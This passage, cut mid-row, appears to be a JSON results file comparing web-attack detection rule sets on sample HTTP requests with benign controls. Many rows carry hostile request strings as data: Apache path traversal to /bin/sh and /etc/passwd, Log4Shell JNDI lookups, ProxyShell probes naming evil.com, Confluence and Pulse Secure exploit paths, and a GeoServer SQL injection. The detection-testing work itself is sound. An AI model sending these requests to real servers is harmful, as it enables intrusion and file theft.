@@ -1,0 +1,1270 @@
+{
+ "temp_rows": 90,
+ "samples": 45,
+ "sg1_equals_expected_web01": true,
+ "totals": {
+  "rows": 90,
+  "sg1": 38,
+  "c1": 36,
+  "sgx": 42,
+  "sg1_and_c1": 18,
+  "sg1_only": 20,
+  "c1_only": 18,
+  "status_excluded": 8
+ },
+ "rows": [
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
+   "status": 200,
+   "sg1": [
+    "sg-cve-2021-41773-apache-path-traversal"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2021-41773-apache-path-traversal"
+   ],
+   "c1": [
+    "apache-path-traversal"
+   ],
+   "sgx": [
+    "sg-cve-2021-41773-apache-path-traversal"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
+   "status": 200,
+   "sg1": [
+    "sg-cve-2021-41773-apache-path-traversal"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2021-41773-apache-path-traversal"
+   ],
+   "c1": [
+    "apache-path-traversal"
+   ],
+   "sgx": [
+    "sg-cve-2021-41773-apache-path-traversal"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/icons/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
+   "status": 301,
+   "sg1": [
+    "sg-cve-2021-41773-apache-path-traversal"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2021-41773-apache-path-traversal"
+   ],
+   "c1": [
+    "apache-path-traversal"
+   ],
+   "sgx": [
+    "sg-cve-2021-41773-apache-path-traversal"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/icons/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
+   "status": 301,
+   "sg1": [
+    "sg-cve-2021-41773-apache-path-traversal"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2021-41773-apache-path-traversal"
+   ],
+   "c1": [
+    "apache-path-traversal"
+   ],
+   "sgx": [
+    "sg-cve-2021-41773-apache-path-traversal"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
+   "status": 404,
+   "sg1": [],
+   "sg1_nostatus": [
+    "sg-cve-2021-41773-apache-path-traversal"
+   ],
+   "c1": [
+    "apache-path-traversal"
+   ],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
+   "status": 404,
+   "sg1": [],
+   "sg1_nostatus": [
+    "sg-cve-2021-41773-apache-path-traversal"
+   ],
+   "c1": [
+    "apache-path-traversal"
+   ],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/cgi-bin/.%2e/.%2e/bin/sh",
+   "status": null,
+   "sg1": [],
+   "sg1_nostatus": [
+    "sg-cve-2021-41773-apache-path-traversal"
+   ],
+   "c1": [
+    "apache-path-traversal"
+   ],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/cgi-bin/.%2e/.%2e/bin/sh",
+   "status": null,
+   "sg1": [],
+   "sg1_nostatus": [
+    "sg-cve-2021-41773-apache-path-traversal"
+   ],
+   "c1": [
+    "apache-path-traversal"
+   ],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/cgi-bin/../../../../bin/sh",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [
+    "apache-path-traversal"
+   ],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/cgi-bin/../../../../bin/sh",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [
+    "apache-path-traversal"
+   ],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/cgi-bin/../../../etc/passwd",
+   "status": 404,
+   "sg1": [
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "sg1_nostatus": [
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "c1": [
+    "apache-path-traversal"
+   ],
+   "sgx": [
+    "sg-path-traversal-exploitation-attempt"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/cgi-bin/../../../etc/passwd",
+   "status": 404,
+   "sg1": [
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "sg1_nostatus": [
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "c1": [
+    "apache-path-traversal"
+   ],
+   "sgx": [
+    "sg-path-traversal-exploitation-attempt"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/cgi-bin/status.cgi",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/cgi-bin/status.cgi",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/icons/apache_pb.png",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/icons/apache_pb.png",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/?x=${jndi:ldap://203.0.113.5/a}",
+   "status": 404,
+   "sg1": [
+    "sg-cve-2021-44228-log4j"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2021-44228-log4j"
+   ],
+   "c1": [
+    "log4shell-in-path"
+   ],
+   "sgx": [
+    "sg-cve-2021-44228-log4j",
+    "sg-cve-2021-44228-log4j-fields",
+    "sg-ssti-in-access-logs"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/?x=${jndi:ldap://203.0.113.5/a}",
+   "status": 404,
+   "sg1": [
+    "sg-cve-2021-44228-log4j"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2021-44228-log4j"
+   ],
+   "c1": [
+    "log4shell-in-path"
+   ],
+   "sgx": [
+    "sg-cve-2021-44228-log4j",
+    "sg-cve-2021-44228-log4j-fields",
+    "sg-ssti-in-access-logs"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/%24%7Bjndi:ldap://203.0.113.5/a%7D",
+   "status": 400,
+   "sg1": [
+    "sg-cve-2021-44228-log4j"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2021-44228-log4j"
+   ],
+   "c1": [
+    "log4shell-in-path"
+   ],
+   "sgx": [
+    "sg-cve-2021-44228-log4j",
+    "sg-cve-2021-44228-log4j-fields"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/%24%7Bjndi:ldap://203.0.113.5/a%7D",
+   "status": 400,
+   "sg1": [
+    "sg-cve-2021-44228-log4j"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2021-44228-log4j"
+   ],
+   "c1": [
+    "log4shell-in-path"
+   ],
+   "sgx": [
+    "sg-cve-2021-44228-log4j",
+    "sg-cve-2021-44228-log4j-fields"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/${jndi:ldap://w.nessus.org/nessus}",
+   "status": 404,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [
+    "log4shell-in-path"
+   ],
+   "sgx": [
+    "sg-cve-2021-44228-log4j-fields"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/${jndi:ldap://w.nessus.org/nessus}",
+   "status": 404,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [
+    "log4shell-in-path"
+   ],
+   "sgx": [
+    "sg-cve-2021-44228-log4j-fields"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/docs/jndi-lookup.html",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/docs/jndi-lookup.html",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/search?q=%24%7Bprice%7D",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/search?q=%24%7Bprice%7D",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "POST",
+   "url": "/plugins/drag-and-drop/upload.action?pageId=65537&filename=../../../../opt/x.jsp&size=8",
+   "status": 200,
+   "sg1": [
+    "sg-cve-2019-3398-confluence"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2019-3398-confluence"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-cve-2019-3398-confluence"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "POST",
+   "url": "/plugins/drag-and-drop/upload.action?pageId=65537&filename=../../../../opt/x.jsp&size=8",
+   "status": 200,
+   "sg1": [
+    "sg-cve-2019-3398-confluence"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2019-3398-confluence"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-cve-2019-3398-confluence"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/plugins/drag-and-drop/upload.action?pageId=65537&filename=../../../../opt/x.jsp&size=8",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/plugins/drag-and-drop/upload.action?pageId=65537&filename=../../../../opt/x.jsp&size=8",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "POST",
+   "url": "/plugins/drag-and-drop/upload.action?pageId=65537&filename=report.pdf&size=8",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "POST",
+   "url": "/plugins/drag-and-drop/upload.action?pageId=65537&filename=report.pdf&size=8",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "POST",
+   "url": "/json/setup-restore.action?synchronous=true",
+   "status": 200,
+   "sg1": [
+    "sg-exploit-cve-2023-22518-confluence"
+   ],
+   "sg1_nostatus": [
+    "sg-exploit-cve-2023-22518-confluence"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-exploit-cve-2023-22518-confluence"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "POST",
+   "url": "/json/setup-restore.action?synchronous=true",
+   "status": 200,
+   "sg1": [
+    "sg-exploit-cve-2023-22518-confluence"
+   ],
+   "sg1_nostatus": [
+    "sg-exploit-cve-2023-22518-confluence"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-exploit-cve-2023-22518-confluence"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "POST",
+   "url": "/json/setup-restore-local.action",
+   "status": 302,
+   "sg1": [
+    "sg-exploit-cve-2023-22518-confluence"
+   ],
+   "sg1_nostatus": [
+    "sg-exploit-cve-2023-22518-confluence"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-exploit-cve-2023-22518-confluence"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "POST",
+   "url": "/json/setup-restore-local.action",
+   "status": 302,
+   "sg1": [
+    "sg-exploit-cve-2023-22518-confluence"
+   ],
+   "sg1_nostatus": [
+    "sg-exploit-cve-2023-22518-confluence"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-exploit-cve-2023-22518-confluence"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "POST",
+   "url": "/json/setup-restore.action",
+   "status": 404,
+   "sg1": [],
+   "sg1_nostatus": [
+    "sg-exploit-cve-2023-22518-confluence"
+   ],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "POST",
+   "url": "/json/setup-restore.action",
+   "status": 404,
+   "sg1": [],
+   "sg1_nostatus": [
+    "sg-exploit-cve-2023-22518-confluence"
+   ],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/server-info.action",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/server-info.action",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "POST",
+   "url": "/json/startheartbeatactivity.action",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "POST",
+   "url": "/json/startheartbeatactivity.action",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=%2FwEyhAYAAQAAAP",
+   "status": 200,
+   "sg1": [
+    "sg-cve-2020-0688-msexchange"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2020-0688-msexchange"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-cve-2020-0688-exchange-exploit",
+    "sg-cve-2020-0688-msexchange"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=%2FwEyhAYAAQAAAP",
+   "status": 200,
+   "sg1": [
+    "sg-cve-2020-0688-msexchange"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2020-0688-msexchange"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-cve-2020-0688-exchange-exploit",
+    "sg-cve-2020-0688-msexchange"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "POST",
+   "url": "/ecp/default.aspx?__VIEWSTATE=x",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "POST",
+   "url": "/ecp/default.aspx?__VIEWSTATE=x",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2fmail%2fowa%2f",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [
+    "exchange-owa"
+   ],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2fmail%2fowa%2f",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [
+    "exchange-owa"
+   ],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com",
+   "status": 401,
+   "sg1": [
+    "sg-exchange-proxyshell-1",
+    "sg-exchange-proxyshell-2"
+   ],
+   "sg1_nostatus": [
+    "sg-exchange-proxyshell-1",
+    "sg-exchange-proxyshell-2"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-exchange-proxyshell-1",
+    "sg-exchange-proxyshell-2"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com",
+   "status": 401,
+   "sg1": [
+    "sg-exchange-proxyshell-1",
+    "sg-exchange-proxyshell-2"
+   ],
+   "sg1_nostatus": [
+    "sg-exchange-proxyshell-1",
+    "sg-exchange-proxyshell-2"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-exchange-proxyshell-1",
+    "sg-exchange-proxyshell-2"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/autodiscover/autodiscover.json/EWS/Exchange.asmx",
+   "status": 401,
+   "sg1": [
+    "sg-exchange-proxyshell-1"
+   ],
+   "sg1_nostatus": [
+    "sg-exchange-proxyshell-1"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-exchange-proxyshell-1"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/autodiscover/autodiscover.json/EWS/Exchange.asmx",
+   "status": 401,
+   "sg1": [
+    "sg-exchange-proxyshell-1"
+   ],
+   "sg1_nostatus": [
+    "sg-exchange-proxyshell-1"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-exchange-proxyshell-1"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/autodiscover/autodiscover.json%3f@foo.com",
+   "status": 401,
+   "sg1": [
+    "sg-exchange-proxyshell-2"
+   ],
+   "sg1_nostatus": [
+    "sg-exchange-proxyshell-2"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-exchange-proxyshell-2"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/autodiscover/autodiscover.json%3f@foo.com",
+   "status": 401,
+   "sg1": [
+    "sg-exchange-proxyshell-2"
+   ],
+   "sg1_nostatus": [
+    "sg-exchange-proxyshell-2"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-exchange-proxyshell-2"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/autodiscover/autodiscover.json?@x.com/powershell/?X-Rps-CAT=abc",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [
+    "sg-exchange-proxyshell-1",
+    "sg-exchange-proxyshell-2"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-exchange-proxyshell-successful"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/autodiscover/autodiscover.json?@x.com/powershell/?X-Rps-CAT=abc",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [
+    "sg-exchange-proxyshell-1",
+    "sg-exchange-proxyshell-2"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-exchange-proxyshell-successful"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "POST",
+   "url": "/autodiscover/autodiscover.xml",
+   "status": 401,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "POST",
+   "url": "/autodiscover/autodiscover.xml",
+   "status": 401,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=topp:states&CQL_FILTER=strStartsWith(STATE_NAME,%27x%27%27)+%3D+true+AND+1%3D(SELECT+CAST+((SELECT+version())+AS+integer))+--+%27)+%3D+true",
+   "status": 200,
+   "sg1": [
+    "sg-cve-2023-25157-geoserver-sql"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2023-25157-geoserver-sql"
+   ],
+   "c1": [
+    "geoserver"
+   ],
+   "sgx": [
+    "sg-cve-2023-25157-geoserver-sql"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=topp:states&CQL_FILTER=strStartsWith(STATE_NAME,%27x%27%27)+%3D+true+AND+1%3D(SELECT+CAST+((SELECT+version())+AS+integer))+--+%27)+%3D+true",
+   "status": 200,
+   "sg1": [
+    "sg-cve-2023-25157-geoserver-sql"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2023-25157-geoserver-sql"
+   ],
+   "c1": [
+    "geoserver"
+   ],
+   "sgx": [
+    "sg-cve-2023-25157-geoserver-sql"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/geoserver/ows?service=WFS&request=GetFeature&typeName=topp:states&CQL_FILTER=strStartsWith(STATE_NAME,%27Tex%27)%3Dtrue",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [
+    "geoserver"
+   ],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/geoserver/ows?service=WFS&request=GetFeature&typeName=topp:states&CQL_FILTER=strStartsWith(STATE_NAME,%27Tex%27)%3Dtrue",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [
+    "geoserver"
+   ],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/geoserver/web/",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [
+    "geoserver"
+   ],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/geoserver/web/",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [
+    "geoserver"
+   ],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/",
+   "status": 200,
+   "sg1": [
+    "sg-cve-2019-11510-pulsesecure-exploit",
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2019-11510-pulsesecure-exploit",
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "c1": [
+    "ivanti-connect-secure"
+   ],
+   "sgx": [
+    "sg-cve-2019-11510-pulsesecure-exploit",
+    "sg-path-traversal-exploitation-attempt"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/",
+   "status": 200,
+   "sg1": [
+    "sg-cve-2019-11510-pulsesecure-exploit",
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2019-11510-pulsesecure-exploit",
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "c1": [
+    "ivanti-connect-secure"
+   ],
+   "sgx": [
+    "sg-cve-2019-11510-pulsesecure-exploit",
+    "sg-path-traversal-exploitation-attempt"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd",
+   "status": 404,
+   "sg1": [
+    "sg-cve-2019-11510-pulsesecure-exploit",
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2019-11510-pulsesecure-exploit",
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "c1": [
+    "ivanti-connect-secure"
+   ],
+   "sgx": [
+    "sg-cve-2019-11510-pulsesecure-exploit",
+    "sg-path-traversal-exploitation-attempt"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd",
+   "status": 404,
+   "sg1": [
+    "sg-cve-2019-11510-pulsesecure-exploit",
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2019-11510-pulsesecure-exploit",
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "c1": [
+    "ivanti-connect-secure"
+   ],
+   "sgx": [
+    "sg-cve-2019-11510-pulsesecure-exploit",
+    "sg-path-traversal-exploitation-attempt"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/dana/html5acc/guacamole/",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/dana/html5acc/guacamole/",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/dana-na/nc/nc_gina_ver.txt",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [
+    "ivanti-connect-secure"
+   ],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/dana-na/nc/nc_gina_ver.txt",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [
+    "ivanti-connect-secure"
+   ],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/dana-na/auth/saml-logout.cgi?token=AAAA",
+   "status": 200,
+   "sg1": [
+    "sg-cve-2021-22893-pulse-secure-rce"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2021-22893-pulse-secure-rce"
+   ],
+   "c1": [
+    "ivanti-connect-secure"
+   ],
+   "sgx": [
+    "sg-cve-2021-22893-pulse-secure-rce"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/dana-na/auth/saml-logout.cgi?token=AAAA",
+   "status": 200,
+   "sg1": [
+    "sg-cve-2021-22893-pulse-secure-rce"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2021-22893-pulse-secure-rce"
+   ],
+   "c1": [
+    "ivanti-connect-secure"
+   ],
+   "sgx": [
+    "sg-cve-2021-22893-pulse-secure-rce"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/dana-cached/setup/meeting/x.cgi",
+   "status": 200,
+   "sg1": [
+    "sg-cve-2021-22893-pulse-secure-rce"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2021-22893-pulse-secure-rce"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-cve-2021-22893-pulse-secure-rce"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/dana-cached/setup/meeting/x.cgi",
+   "status": 200,
+   "sg1": [
+    "sg-cve-2021-22893-pulse-secure-rce"
+   ],
+   "sg1_nostatus": [
+    "sg-cve-2021-22893-pulse-secure-rce"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-cve-2021-22893-pulse-secure-rce"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/dana-na/auth/url_default/welcome.cgi",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [
+    "ivanti-connect-secure"
+   ],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/dana-na/auth/url_default/welcome.cgi",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [
+    "ivanti-connect-secure"
+   ],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/meeting/join?id=5",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/meeting/join?id=5",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/index.php?page=../../../etc/passwd",
+   "status": 200,
+   "sg1": [
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "sg1_nostatus": [
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-path-traversal-exploitation-attempt"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/index.php?page=../../../etc/passwd",
+   "status": 200,
+   "sg1": [
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "sg1_nostatus": [
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-path-traversal-exploitation-attempt"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/..%252f..%252f..%252fetc%252fpasswd",
+   "status": 400,
+   "sg1": [
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "sg1_nostatus": [
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-path-traversal-exploitation-attempt"
+   ]
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/..%252f..%252f..%252fetc%252fpasswd",
+   "status": 400,
+   "sg1": [
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "sg1_nostatus": [
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "c1": [],
+   "sgx": [
+    "sg-path-traversal-exploitation-attempt"
+   ]
+  },
+  {
+   "sensor": "web-01",
+   "method": "GET",
+   "url": "/static/../img/logo.png",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "decoy",
+   "method": "GET",
+   "url": "/static/../img/logo.png",
+   "status": 200,
+   "sg1": [],
+   "sg1_nostatus": [],
+   "c1": [],
+   "sgx": []
+  },
+  {
+   "sensor": "web-01",
